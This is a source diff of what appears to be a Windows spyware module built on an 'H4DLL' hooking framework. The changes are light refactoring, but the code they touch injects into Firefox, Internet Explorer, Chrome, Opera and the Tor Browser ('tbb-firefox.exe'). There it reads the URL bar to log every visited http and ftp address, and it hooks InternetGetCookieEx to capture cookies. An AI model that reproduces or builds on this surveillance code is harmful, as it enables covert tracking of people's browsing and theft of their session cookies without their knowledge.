@@ -1,7 +1,22 @@
+#define _CRT_SECURE_NO_WARNINGS 1
+
+#include <Windows.h>
+#include <json/JSON.h>
+#include <time.h>
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/H4-DLL.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/AM_Core.h"
+#include "../../H4DLL/HM_IpcModule.h"
+#include "../../H4DLL/HM_InbundleHook.h"
+#include "../../H4DLL/bin_string.h"
+#include "../../H4DLL/LOG.h"
+
 #include <mshtml.h>
 #include <oleacc.h>
 #include <new>
 #include "ISimpleDOMDocument.h"
+#include "HM_UrlLog.h"
 
 #define MAXURLLEN 1024
 #define MAXURLTITLELEN 256
@@ -12,19 +27,6 @@ LPFNOBJECTFROMLRESULT pfObjectFromLresult = NULL;
 BOOL m_url_found = FALSE;
 #define URL_LOG_VER 0x20100713
 
-typedef BOOL (WINAPI *IsWindow_t) (HWND);
-typedef struct {
-	COMMONDATA;
-	IsWindow_t pIsWindow;
-#define BROWSER_UNKNOWN      0x00000000
-#define BROWSER_IE           0x00000001
-#define BROWSER_MOZILLA      0x00000002
-#define BROWSER_OPERA		 0x00000003
-#define BROWSER_CHROME		 0x00000005
-#define BROWSER_TYPE_MASK    0x3FFFFFFF
-#define BROWSER_SETTITLE     0x80000000
-	DWORD browser_type;
-} SendMessageURLStruct;
 SendMessageURLStruct SendMessageURLData;
 
 typedef struct {
@@ -73,16 +75,16 @@ DWORD PM_SendMessageURL_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++;
-		if (stricmp(proc_name, "firefox.exe") && stricmp(proc_name, "iexplore.exe") && stricmp(proc_name, "chrome.exe") && stricmp(proc_name, "tbb-firefox.exe"))
+		if (_stricmp(proc_name, "firefox.exe") && _stricmp(proc_name, "iexplore.exe") && _stricmp(proc_name, "chrome.exe") && _stricmp(proc_name, "tbb-firefox.exe"))
 			return 1; // Hooka solo firefox e iexplorer
 	} else
 		return 1;
 
-	if (!stricmp(proc_name, "firefox.exe"))
+	if (!_stricmp(proc_name, "firefox.exe"))
 		SendMessageURLData.browser_type = BROWSER_MOZILLA;
-	else if (!stricmp(proc_name, "iexplore.exe"))
+	else if (!_stricmp(proc_name, "iexplore.exe"))
 		SendMessageURLData.browser_type = BROWSER_IE;
-	else if (!stricmp(proc_name, "chrome.exe"))
+	else if (!_stricmp(proc_name, "chrome.exe"))
 		SendMessageURLData.browser_type = BROWSER_CHROME;
 	else
 		SendMessageURLData.browser_type = BROWSER_UNKNOWN;
@@ -128,16 +130,16 @@ DWORD PM_SetWindowText_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++;
-		if (stricmp(proc_name, "opera.exe") && stricmp(proc_name, "chrome.exe") && stricmp(proc_name, "iexplore.exe"))
+		if (_stricmp(proc_name, "opera.exe") && _stricmp(proc_name, "chrome.exe") && _stricmp(proc_name, "iexplore.exe"))
 			return 1; // Hooka solo opera
 	} else
 		return 1;
 
-	if (!stricmp(proc_name, "opera.exe"))
+	if (!_stricmp(proc_name, "opera.exe"))
 		SendMessageURLData.browser_type = BROWSER_OPERA;
-	else if (!stricmp(proc_name, "chrome.exe"))
+	else if (!_stricmp(proc_name, "chrome.exe"))
 		SendMessageURLData.browser_type = BROWSER_CHROME;
-	else if (!stricmp(proc_name, "iexplore.exe"))
+	else if (!_stricmp(proc_name, "iexplore.exe"))
 		SendMessageURLData.browser_type = BROWSER_IE;
 	else
 		SendMessageURLData.browser_type = BROWSER_UNKNOWN;
@@ -161,7 +163,7 @@ void WriteLogURL(WCHAR *url, UrlLogParamsStruct *pUrlLogParams, BOOL check_url)
 		return;
 
 	// Logghiamo solo i protocolli interessanti
-	if (check_url && wcsnicmp(url, L"http", 4) && wcsnicmp(url, L"ftp", 3))
+	if (check_url && _wcsnicmp(url, L"http", 4) && _wcsnicmp(url, L"ftp", 3))
 		return;
 
 	_snwprintf_s(url_info->url_name, MAXURLLEN, _TRUNCATE, L"%s", url);
@@ -204,7 +206,7 @@ BOOL isURL(WCHAR *url)
 	if ((*ptr) == 0 || (*ptr) == L'.')
 		return FALSE;
 	ptr++;
-	if (!wcschr(ptr, L'.') && !wcschr(ptr, L'//')) 
+	if (!wcschr(ptr, L'.') && !wcschr(ptr, L'/')) 
 		return FALSE;
 
 	return TRUE;
@@ -390,15 +392,6 @@ void GetURLBarContent(HWND hWnd, DWORD browser_type)
 	CoUninitialize();
 }			
 
-
-
-typedef WCHAR * (WINAPI *StrStrW_t) (WCHAR *, WCHAR *);
-#define MAX_COOKIE_SIZE 2048
-typedef struct {
-	COMMONDATA;
-	WCHAR local_cookie[MAX_COOKIE_SIZE];
-	StrStrW_t pStrStrW;
-} InternetGetCookieExStruct;
 InternetGetCookieExStruct InternetGetCookieExData;
 
 #define WCSLEN(x,y) { y=0; for(;x[y];y++);}
@@ -533,7 +526,7 @@ DWORD PM_InternetGetCookieEx_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++;
-		if (stricmp(proc_name, "iexplore.exe"))
+		if (_stricmp(proc_name, "iexplore.exe"))
 			return 1; // Hooka solo iexplorer
 	} else
 		return 1;
